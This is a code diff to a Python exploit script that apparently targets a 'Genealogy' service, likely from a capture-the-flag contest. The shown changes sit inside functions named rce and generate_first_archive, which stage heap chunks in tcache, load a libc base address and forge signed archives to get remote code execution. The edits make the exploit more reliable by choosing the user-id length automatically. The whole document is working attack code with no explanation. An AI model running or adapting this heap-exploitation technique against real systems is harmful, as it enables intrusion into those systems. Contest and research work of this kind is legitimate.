@@ -81,14 +81,14 @@ def generate_payload(total_length: int) -> list[int]:
     return result + list(range(1, total_length - len(result) + 1))
 
 
-async def generate_first_archive(endpoint: str) -> tuple[bytes, bytes]:
+async def generate_first_archive(endpoint: str) -> tuple[int, bytes, bytes]:
     login = generate_random_string()
     password = generate_random_string()
 
     description_length = 0x257 - 160  # 0x217 is desired total length, 160 is a total size of other fields
 
     async with GenealogyClient(endpoint) as client:
-        await client.create_user(login, password)
+        user_id = await client.create_user(login, password)
         await client.login(login, password)
         # Put enough chunks to tcache (2 will be enough)
         grandparent = await client.create_person("", 1, None, None, None)
@@ -101,7 +101,8 @@ async def generate_first_archive(endpoint: str) -> tuple[bytes, bytes]:
 
         archive_with_signature = await client.download_tree_archive()
 
-    return extract_archive_and_signature(archive_with_signature)
+    archive, signature = extract_archive_and_signature(archive_with_signature)
+    return user_id, archive, signature
 
 
 async def generate_second_archive(endpoint: str, user_id_length: int, total_length: int) -> tuple[str, str, bytes, bytes]:
@@ -158,7 +159,7 @@ async def rce(endpoint: str, libc_address: int):
     libc = ELF("./libc-2.31.so")
     libc.address = libc_address
 
-    archive1, signature1 = await generate_first_archive(endpoint)
+    user_id, archive1, signature1 = await generate_first_archive(endpoint)
     print("Archive for user 1:")
     print_bytes_hex(archive1)
     print("Was padded by:", end=" ")
@@ -167,8 +168,7 @@ async def rce(endpoint: str, libc_address: int):
     print("Signature for user 1:", end=" ")
     print_bytes_hex(signature1)
 
-    # Change 2 to 1 if user_id is small enough (<= 127)
-    login2, password2, archive2, signature2 = await generate_second_archive(endpoint, 2, len(archive1))
+    login2, password2, archive2, signature2 = await generate_second_archive(endpoint, 1 if user_id < 127 else 2, len(archive1))
     print("Archive for user 2:")
     print_bytes_hex(archive2)
     print("Was padded by:", end=" ")
